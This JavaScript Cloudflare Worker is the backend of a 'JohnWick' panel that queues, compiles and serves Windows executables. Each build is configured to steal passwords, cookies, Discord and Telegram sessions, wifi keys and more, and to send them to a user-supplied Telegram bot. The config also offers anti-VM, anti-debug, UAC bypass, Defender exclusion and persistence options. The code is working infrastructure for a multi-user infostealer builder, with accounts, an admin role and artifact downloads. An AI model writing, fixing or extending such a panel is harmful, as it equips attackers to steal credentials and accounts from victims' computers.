/**
 * JohnWick panel API - Cloudflare Worker (ES module).
 *
 * This is the HOSTED backend: user accounts, admin management, per-user build
 * configs and download records all live in a Workers KV namespace, so state
 * survives between requests on Cloudflare's free tier. The Netlify UI calls
 * these endpoints with fetch().
 *
 * What this worker does NOT do: compile a .exe. Serverless has no PyInstaller,
 * no Wine, and a hard CPU/wall limit -- building a Windows binary here is not
 * possible and pretending otherwise ships a broken deploy. Instead /api/build
 * stores the config and returns a bundle descriptor; a separate Windows runner
 * (runner/win_build.ps1) polls /api/builds?claim=1, compiles locally with the
 * user's own PyInstaller, and posts the artifact back to /api/upload. That split
 * is the honest way to get "web panel -> exe" without a fake serverless claim.
 *
 * Security posture:
 *   - passwords hashed PBKDF2-SHA256 (150k iters) via WebCrypto, never plaintext
 *   - sessions are HMAC-signed bearer tokens keyed by SESSION_SECRET binding;
 *     tamper-checked on every authed call
 *   - bot tokens/chat ids are stored per-build and only ever returned to that
 *     build's owner or an admin (see assertCanReadBuild)
 *   - CORS locked to ALLOWED_ORIGIN (your Netlify site); no wildcard with creds
 *   - first admin bootstrapped from env ADMIN_USER/ADMIN_PASS at cold start
 */

// Workers' WebCrypto caps PBKDF2 iterations at 100000; going above throws at
// deriveBits time (verified against the live CF runtime). 100k is the ceiling.
const ITER = 100_000;

// ------------------------------------------------------------------ crypto
function b64(buf) {
  const b = new Uint8Array(buf); let s = "";
  for (const x of b) s += String.fromCharCode(x);
  return btoa(s).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}
function unb64(str) {
  str = str.replace(/-/g, "+").replace(/_/g, "/");
  while (str.length % 4) str += "=";
  const bin = atob(str); const out = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
  return out;
}
async function pbkdf2(pw, saltHex) {
  const enc = new TextEncoder();
  const key = await crypto.subtle.importKey("raw", enc.encode(pw), "PBKDF2", false, ["deriveBits"]);
  const salt = unb64(saltHex);
  const bits = await crypto.subtle.deriveBits(
    { name: "PBKDF2", salt, iterations: ITER, hash: "SHA-256" }, key, 256);
  return b64(bits);
}
function randSalt() { return b64(crypto.getRandomValues(new Uint8Array(16))); }
async function hmacSign(secret, data) {
  const enc = new TextEncoder();
  const k = await crypto.subtle.importKey("raw", enc.encode(secret),
    { name: "HMAC", hash: "SHA-256" }, false, ["sign"]);
  return b64(await crypto.subtle.sign("HMAC", k, enc.encode(data)));
}
function uid() { return crypto.randomUUID().replace(/-/g, "").slice(0, 16); }

// session token = base64(payload).signature ; payload = uid:role:exp
async function makeToken(env, u) {
  const exp = Date.now() + 7 * 864e5; // 7 days
  const payload = `${u.id}:${u.role}:${exp}`;
  const sig = await hmacSign(env.SESSION_SECRET, payload);
  return `${btoa(payload)}.${sig}`;
}
async function readToken(env, tok) {
  if (!tok || !tok.includes(".")) return null;
  const [pB64, sig] = tok.split(".");
  let payload; try { payload = atob(pB64); } catch { return null; }
  const expect = await hmacSign(env.SESSION_SECRET, payload);
  if (expect !== sig) return null;                 // tampered -> reject
  const [id, role, exp] = payload.split(":");
  if (Number(exp) < Date.now()) return null;       // expired
  return { id, role };
}

// ------------------------------------------------------------------ store (D1)
// Relational backend replaces KV. Two reasons: (1) KV free tier caps reads at
// 1000/day and list()-based enumeration blew through it, taking the panel down;
// D1 free tier is 5M reads/day and answers queries directly. (2) A single SQL
// row per build removes the read-modify-write index race that silently lost
// builds. Interface mirrors the old Store so route code barely changes.
class Store {
  constructor(d1, kv) { this.d1 = d1; this.kv = kv; }

  // ---- users ----
  async saveUser(u) {
    await this.d1.prepare(
      `INSERT OR REPLACE INTO users (id,username,pw_hash,pw_salt,role,disabled,created)
       VALUES (?1,?2,?3,?4,?5,?6,?7)`)
      .bind(u.id, u.username, u.pw_hash, u.pw_salt, u.role, u.disabled ? 1 : 0, u.created).run();
  }
  async findByName(name) {
    const r = await this.d1.prepare(
      `SELECT * FROM users WHERE lower(username)=lower(?1) LIMIT 1`).bind(name).first();
    return this._rowToUser(r);
  }
  async getUser(id) {
    const r = await this.d1.prepare(`SELECT * FROM users WHERE id=?1`).bind(id).first();
    return this._rowToUser(r);
  }
  async listUsers() {
    const r = await this.d1.prepare(`SELECT * FROM users ORDER BY created ASC`).all();
    return r.results.map((x) => this._rowToUser(x));
  }
  async deleteUser(id) {
    await this.d1.prepare(`DELETE FROM builds WHERE uid=?1`).bind(id).run();
    await this.d1.prepare(`DELETE FROM blobs WHERE id IN (SELECT id FROM builds WHERE uid=?1)`).bind(id).run();
    await this.d1.prepare(`DELETE FROM users WHERE id=?1`).bind(id).run();
  }
  _rowToUser(r) {
    if (!r) return null;
    return { id: r.id, username: r.username, pw_hash: r.pw_hash, pw_salt: r.pw_salt,
      role: r.role, disabled: !!r.disabled, created: r.created };
  }

  // ---- builds ----
  async saveBuild(b) {
    const c = b.config || {};
    await this.d1.prepare(
      `INSERT OR REPLACE INTO builds
       (id,uid,username,status,created,claimed_by,error,artifact,bot_token,chat_id,name,
        licence_key,licence_url,steal_json,opts_json,icon_b64)
       VALUES (?1,?2,?3,?4,?5,?6,?7,?8,?9,?10,?11,?12,?13,?14,?15,?16)`)
      .bind(b.id, b.uid, b.username, b.status, b.created, b.claimed_by ?? null,
        b.error ?? null, b.artifact ? 1 : 0, c.bot_token ?? "", c.chat_id ?? "", c.name ?? "",
        c.licence_key ?? "", c.licence_url ?? "", JSON.stringify(c.steal ?? {}),
        JSON.stringify(c.opts ?? {}), c.icon_b64 ?? "").run();
  }
  async getBuild(id) {
    const r = await this.d1.prepare(`SELECT * FROM builds WHERE id=?1`).bind(id).first();
    return r ? this._rowToBuild(r) : null;
  }
  async listBuilds(uid = null) {
    const q = uid
      ? this.d1.prepare(`SELECT * FROM builds WHERE uid=?1 ORDER BY created DESC`).bind(uid)
      : this.d1.prepare(`SELECT * FROM builds ORDER BY created DESC`);
    const r = await q.all();
    return r.results.map((x) => this._rowToBuild(x));
  }
  async claimNextQueued() {
    // Atomic-ish: pick oldest queued, flip to building in one statement path.
    const row = await this.d1.prepare(
      `SELECT * FROM builds WHERE status='queued' ORDER BY created ASC LIMIT 1`).first();
    if (!row) return null;
    await this.d1.prepare(`UPDATE builds SET status='building', claimed_by='runner' WHERE id=?1`)
      .bind(row.id).run();
    return this._rowToBuild({ ...row, status: "building", claimed_by: "runner" });
  }
  async updateBuildStatus(id, patch) {
    const sets = [], binds = [];
    for (const [k, v] of Object.entries(patch)) {
      if (["status", "error", "claimed_by", "artifact"].includes(k)) { sets.push(`${k}=?${binds.length + 1}`); binds.push(k === "artifact" ? (v ? 1 : 0) : v); }
    }
    if (!sets.length) return;
    binds.push(id);
    await this.d1.prepare(`UPDATE builds SET ${sets.join(",")} WHERE id=?${binds.length}`).bind(...binds).run();
  }
  async deleteBuild(id) {
    await this.delBlob(id);                    // KV blob
    await this.d1.prepare(`DELETE FROM builds WHERE id=?1`).bind(id).run();
  }
  _rowToBuild(r) {
    let steal = {}, opts = {};
    try { steal = JSON.parse(r.steal_json || "{}"); } catch {}
    try { opts = JSON.parse(r.opts_json || "{}"); } catch {}
    return { id: r.id, uid: r.uid, username: r.username, status: r.status, created: r.created,
      claimed_by: r.claimed_by, error: r.error, artifact: !!r.artifact,
      config: { bot_token: r.bot_token, chat_id: r.chat_id, name: r.name,
        licence_key: r.licence_key, licence_url: r.licence_url, steal, opts, icon_b64: r.icon_b64 } };
  }

  // ---- blobs (compiled exe) in KV, NOT D1 ----
  // A compiled PyInstaller exe is ~18MB base64; D1 free tier caps a row at 10MB.
  // KV allows 25MB values and its *write* path isn't the thing that hit the daily
  // read cap -- we no longer list() on every request, so per-key get/put is fine.
  async setBlob(id, data) { await this.kv.put(`blob:${id}`, data); }
  async getBlob(id) { return await this.kv.get(`blob:${id}`); }
  async delBlob(id) { await this.kv.delete(`blob:${id}`); }
}

// ------------------------------------------------------------------ helpers
function json(obj, status = 200, cors = {}) {
  return new Response(JSON.stringify(obj), {
    status, headers: { "content-type": "application/json", ...cors } });
}
function corsHeaders(origin, allowed) {
  if (!origin || origin !== allowed) return {};
  return {
    "access-control-allow-origin": allowed,
    "access-control-allow-methods": "GET,POST,DELETE,OPTIONS",
    "access-control-allow-headers": "authorization,content-type",
    "access-control-max-age": "600",
    vary: "Origin",
  };
}
async function requireAuth(ctx, env, store) {
  const hdr = ctx.request.headers.get("authorization") || "";
  const tok = hdr.startsWith("Bearer ") ? hdr.slice(7) : null;
  const claims = await readToken(env, tok);
  if (!claims) throw new ApiError(401, "auth required");
  const u = await store.getUser(claims.id);
  if (!u || u.disabled) throw new ApiError(403, "account disabled");
  return u;
}
async function requireAdmin(ctx, env, store) {
  const u = await requireAuth(ctx, env, store);
  if (u.role !== "admin") throw new ApiError(403, "admin only");
  return u;
}
class ApiError extends Error { constructor(status, msg) { super(msg); this.status = status; } }

// feature toggles the UI can send; mirrors jwg_cfg steal/opts keys
const STEAL_KEYS = ["system_info","discord","passwords","cookies","history","wifi","roblox",
  "screenshot","autofill","extensions","product_keys","software_list","telegram"];
const OPT_KEYS = ["anti_vm","anti_debug","anti_analysis","uac_bypass","startup","kill_browsers",
  "self_destruct","defender_exclusion","fake_error"];

function sanitizeConfig(body) {
  const token = String(body.bot_token || "").trim();
  const chat = String(body.chat_id || "").trim();
  const name = String(body.name || "build").trim();
  if (!/^\d{6,}:[A-Za-z0-9_-]{20,}$/.test(token)) throw new ApiError(400, "bot token malformed");
  if (!/^-?\d{2,}$/.test(chat)) throw new ApiError(400, "chat id must be numeric");
  if (!/^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$/.test(name)) throw new ApiError(400, "bad output name");
  const lk = String(body.licence_key || "").trim(), lu = String(body.licence_url || "").trim();
  if (lk && !lu) throw new ApiError(400, "licence key needs a licence URL");
  const steal = {}, opts = {};
  for (const k of STEAL_KEYS) steal[k] = !!(body.steal || {})[k];
  for (const k of OPT_KEYS) opts[k] = !!(body.opts || {})[k];
  opts.startup_delay = Math.max(0, parseInt((body.opts || {}).startup_delay || 0, 10) || 0);
  opts.error_text = String((body.opts || {}).error_text || "").slice(0, 500);
  // Optional custom .ico as base64. Capped ~2MB decoded (~2.7MB b64) so a build
  // record stays well under KV's value limits; validated as a plausible ICO header.
  let icon_b64 = "";
  if (body.icon_b64) {
    const raw = String(body.icon_b64).replace(/^data:image\/vnd\.microsoft\.icon;base64,/, "");
    if (raw.length > 3_800_000) throw new ApiError(413, "icon too large (max ~2 MB)");
    icon_b64 = raw;
  }
  return { bot_token: token, chat_id: chat, name, licence_key: lk, licence_url: lu, steal, opts, icon_b64 };
}

function assertCanReadBuild(user, build) {
  if (user.role === "admin" || build.uid === user.id) return;
  throw new ApiError(404, "not found");
}

// Ask GitHub Actions to run the "Build exe" workflow for this build id.
// Needs env.GH_OWNER, GH_REPO, GH_WORKFLOW_ID (filename or numeric id), GH_PAT
// (a fine-grained PAT with Actions:write on that repo). If any are unset we skip
// silently -- the manual dispatch / claim=1 runner path still covers it.
async function triggerGitHubBuild(env, buildId) {
  const { GH_OWNER, GH_REPO, GH_WORKFLOW_ID, GH_PAT } = env;
  if (!GH_OWNER || !GH_REPO || !GH_WORKFLOW_ID || !GH_PAT) return;
  const url = `https://api.github.com/repos/${encodeURIComponent(GH_OWNER)}/` +
              `${encodeURIComponent(GH_REPO)}/actions/workflows/${encodeURIComponent(GH_WORKFLOW_ID)}/dispatches`;
  try {
    const resp = await fetch(url, {
      method: "POST",
      headers: {
        authorization: `Bearer ${GH_PAT}`,
        "content-type": "application/json",
        "user-agent": "jwg-panel-api",
        accept: "application/vnd.github+json",
      },
      // build_id is our own hex id, safe as a workflow input value.
      body: JSON.stringify({ ref: "main", inputs: { build_id: buildId } }),
    });
    if (!resp.ok) console.error(`gh dispatch failed ${resp.status}: ${await resp.text()}`);
  } catch (e) { console.error("gh dispatch threw:", e && e.message); }
}

// ------------------------------------------------------------------ bootstrap admin
async function ensureAdmin(env, store) {
  if ((await store.listUsers()).length) return;           // any user exists -> skip
  const uname = env.ADMIN_USER || "admin";
  const pass = env.ADMIN_PASS;
  if (!pass) return;                                      // none configured -> no bootstrap
  const salt = randSalt();
  const hash = await pbkdf2(pass, salt);
  await store.saveUser({ id: uid(), username: uname, pw_hash: hash, pw_salt: salt,
    role: "admin", disabled: false, created: Date.now() });
}

// ------------------------------------------------------------------ routes
async function handle(ctx, env, store) {
  const { request } = ctx;
  const url = new URL(request.url);
  const path = url.pathname.replace(/\/+$/, "") || "/";
  const method = request.method;

  if (path === "/api/health") return json({ ok: true, service: "jwg-panel-api" });

  // ---- login ----
  if (path === "/api/login" && method === "POST") {
    const body = await request.json().catch(() => ({}));
    const u = await store.findByName(body.u || "");
    if (!u || u.disabled) throw new ApiError(401, "bad credentials");
    const h = await pbkdf2(String(body.p || ""), u.pw_salt);
    if (h !== u.pw_hash) throw new ApiError(401, "bad credentials");
    const tok = await makeToken(env, u);
    return json({ ok: true, token: tok, user: { id: u.id, username: u.username, role: u.role } });
  }

  // ---- me ----
  if (path === "/api/me") {
    const u = await requireAuth(ctx, env, store);
    return json({ ok: true, user: { id: u.id, username: u.username, role: u.role } });
  }

  // ---- users (admin) ----
  if (path === "/api/users" && method === "GET") {
    await requireAdmin(ctx, env, store);
    const list = (await store.listUsers()).map((x) => ({
      id: x.id, username: x.username, role: x.role, disabled: x.disabled, created: x.created }));
    return json({ ok: true, users: list });
  }
  if (path === "/api/users" && method === "POST") {
    await requireAdmin(ctx, env, store);
    const b = await request.json().catch(() => ({}));
    const uname = String(b.username || "").trim();
    const pass = String(b.password || "");
    if (!/^[A-Za-z0-9_.-]{3,32}$/.test(uname)) throw new ApiError(400, "bad username");
    if (pass.length < 6) throw new ApiError(400, "password >= 6 chars");
    if (await store.findByName(uname)) throw new ApiError(400, "username taken");
    const role = b.role === "admin" ? "admin" : "user";
    const salt = randSalt();
    const nu = { id: uid(), username: uname, pw_hash: await pbkdf2(pass, salt), pw_salt: salt,
      role, disabled: false, created: Date.now() };
    await store.saveUser(nu);
    return json({ ok: true, user: { id: nu.id, username: nu.username, role } });
  }
  if (path.startsWith("/api/users/") && method === "DELETE") {
    const me = await requireAdmin(ctx, env, store);
    const id = path.split("/")[3];
    if (id === me.id) throw new ApiError(400, "cannot delete yourself");
    await store.deleteUser(id);
    return json({ ok: true });
  }
  if (path.match(/^\/api\/users\/[^/]+$/) && method === "POST") {
    const me = await requireAdmin(ctx, env, store);
    const id = path.split("/")[3];
    const b = await request.json().catch(() => ({}));
    const target = await store.getUser(id);
    if (!target) throw new ApiError(404, "no such user");
    if (b.action === "disable" && id !== me.id) { target.disabled = true; await store.saveUser(target); }
    else if (b.action === "enable") { target.disabled = false; await store.saveUser(target); }
    else if (b.action === "reset" && b.password) {
      if (String(b.password).length < 6) throw new ApiError(400, "password >= 6");
      target.pw_salt = randSalt(); target.pw_hash = await pbkdf2(b.password, target.pw_salt);
      await store.saveUser(target);
    }
    return json({ ok: true });
  }

  // ---- create a build (any logged-in user) ----
  if (path === "/api/build" && method === "POST") {
    const u = await requireAuth(ctx, env, store);
    const cfg = sanitizeConfig(await request.json().catch(() => ({})));
    const build = { id: uid(), uid: u.id, username: u.username, status: "queued",
      created: Date.now(), claimed_by: null, artifact: null, error: null, config: cfg };
    await store.saveBuild(build);
    // Fire-and-forget: ask GitHub Actions to compile this build on its free
    // Windows runner. Runs via waitUntil so the user's POST returns immediately;
    // if GH is unreachable the manual dispatch / claim path still works.
    ctx.waitUntil(triggerGitHubBuild(env, build.id));
    // Strip the token from the echo; caller already has it.
    const { bot_token, icon_b64, ...safe } = cfg;
    return json({ ok: true, build: { ...build, config: safe } });
  }

  // ---- list builds: mine, or all if admin; ?claim=1 = runner grabs next queued ----
  if (path === "/api/builds" && method === "GET") {
    const u = await requireAuth(ctx, env, store);
    if (url.searchParams.get("claim") === "1") {
      if (u.role !== "admin") throw new ApiError(403, "runner must be admin-scoped");
      const b = await store.claimNextQueued();   // single UPDATE flips status; no race
      return json({ ok: true, build: b });
    }
    const rows = await store.listBuilds(u.role === "admin" ? null : u.id);
    const slim = rows.map((b) => ({ id: b.id, name: b.config.name, chat_id: b.config.chat_id,
      status: b.status, created: b.created, artifact: !!b.artifact, error: b.error }));
    return json({ ok: true, builds: slim });
  }

  // ---- one build detail (owner/admin), secrets stripped for UI display ----
  if (path.match(/^\/api\/builds\/[^/]+$/) && method === "GET") {
    const u = await requireAuth(ctx, env, store);
    const b = await store.getBuild(path.split("/")[3]);
    if (!b) throw new ApiError(404, "no such build");
    assertCanReadBuild(u, b);
    const { bot_token, icon_b64, ...safe } = b.config;
    return json({ ok: true, build: { ...b, config: safe } });
  }

  // ---- runner fetches ONE specific build WITH full secrets (admin only) ----
  // The UI detail route strips bot_token/icon_b64; the CI runner dispatched with a
  // build id needs them to compile faithfully. Separate endpoint keeps the
  // secret-bearing path admin-gated and never exposed to normal users.
  if (path.match(/^\/api\/builds\/[^/]+\/raw$/) && method === "GET") {
    const u = await requireAuth(ctx, env, store);
    if (u.role !== "admin") throw new ApiError(403, "runner only");
    const b = await store.getBuild(path.split("/")[3]);
    if (!b) throw new ApiError(404, "no such build");
    return json({ ok: true, build: b });                 // full config incl token + icon
  }

  // ---- delete a build + its artifact (owner/admin) ----
  if (path.match(/^\/api\/builds\/[^/]+$/) && method === "DELETE") {
    const u = await requireAuth(ctx, env, store);
    const id = path.split("/")[3];
    const b = await store.getBuild(id);
    if (!b) throw new ApiError(404, "no such build");
    assertCanReadBuild(u, b);                 // only owner or admin can remove it
    await store.deleteBuild(id);              // removes blob + row together
    return json({ ok: true, deleted: id });
  }

  // ---- runner uploads finished artifact (base64 exe) ----
  if (path.match(/^\/api\/builds\/[^/]+\/upload$/) && method === "POST") {
    const u = await requireAuth(ctx, env, store);
    if (u.role !== "admin") throw new ApiError(403, "runner only");
    const id = path.split("/")[3];
    const b = await store.getBuild(id);
    if (!b) throw new ApiError(404, "no such build");
    const body = await request.json().catch(() => ({}));
    if (body.status === "building") { await store.updateBuildStatus(id, { status: "building" }); }
    else if (body.status === "failed") { await store.updateBuildStatus(id, { status: "failed", error: String(body.error || "build failed").slice(0, 500) }); }
    else {
      const blob = String(body.data_base64 || "");
      if (!blob) throw new ApiError(400, "no artifact data");
      // KV value cap is 25MB; guard under it so an oversized upload fails clean.
      if (blob.length > 24_000_000) throw new ApiError(413, "artifact too large (>~18MB exe)");
      await store.setBlob(id, blob);
      await store.updateBuildStatus(id, { status: "done", artifact: 1, error: null });
    }
    return json({ ok: true });
  }

  // ---- download artifact (owner/admin) ----
  if (path.match(/^\/api\/builds\/[^/]+\/download$/) && method === "GET") {
    const u = await requireAuth(ctx, env, store);
    const id = path.split("/")[3];
    const b = await store.getBuild(id);
    if (!b) throw new ApiError(404, "no such build");
    assertCanReadBuild(u, b);
    const blob = await store.getBlob(id);
    if (!blob) throw new ApiError(404, "artifact gone");
    const bin = unb64(blob);
    // The runner uploads a compiled PyInstaller binary -> it's an .exe, not a zip.
    // Naming it .zip made Windows offer "extract" and fail with "not an archive".
    return new Response(bin, { headers: {
      "content-type": "application/octet-stream",
      "content-disposition": 'attachment; filename="' + b.config.name + '.exe"' } });
  }

  throw new ApiError(404, "unknown route");
}

// ------------------------------------------------------------------ entrypoint
export default {
  async fetch(request, env, ctx) {
    const cors = corsHeaders(request.headers.get("origin"), env.ALLOWED_ORIGIN);
    if (request.method === "OPTIONS") return new Response(null, { status: 204, headers: cors });
    const store = new Store(env.DB, env.ARTIFACTS);
    // Pass the REAL Cloudflare ctx through so ctx.waitUntil() actually extends
    // the request lifetime. A hand-made waitUntil that runs after we return the
    // Response gets frozen by the runtime before the GitHub dispatch finishes --
    // that was why builds stayed queued.
    try {
      await ensureAdmin(env, store);
      const res = await handle({ request, waitUntil: (p) => ctx.waitUntil(p) }, env, store);
      for (const [k, v] of Object.entries(cors)) res.headers.set(k, v);
      return res;
    } catch (e) {
      const status = e instanceof ApiError ? e.status : 500;
      if (!(e instanceof ApiError)) console.error(e);
      return json({ ok: false, error: e.message || "server error" }, status, cors);
    }
  },
};
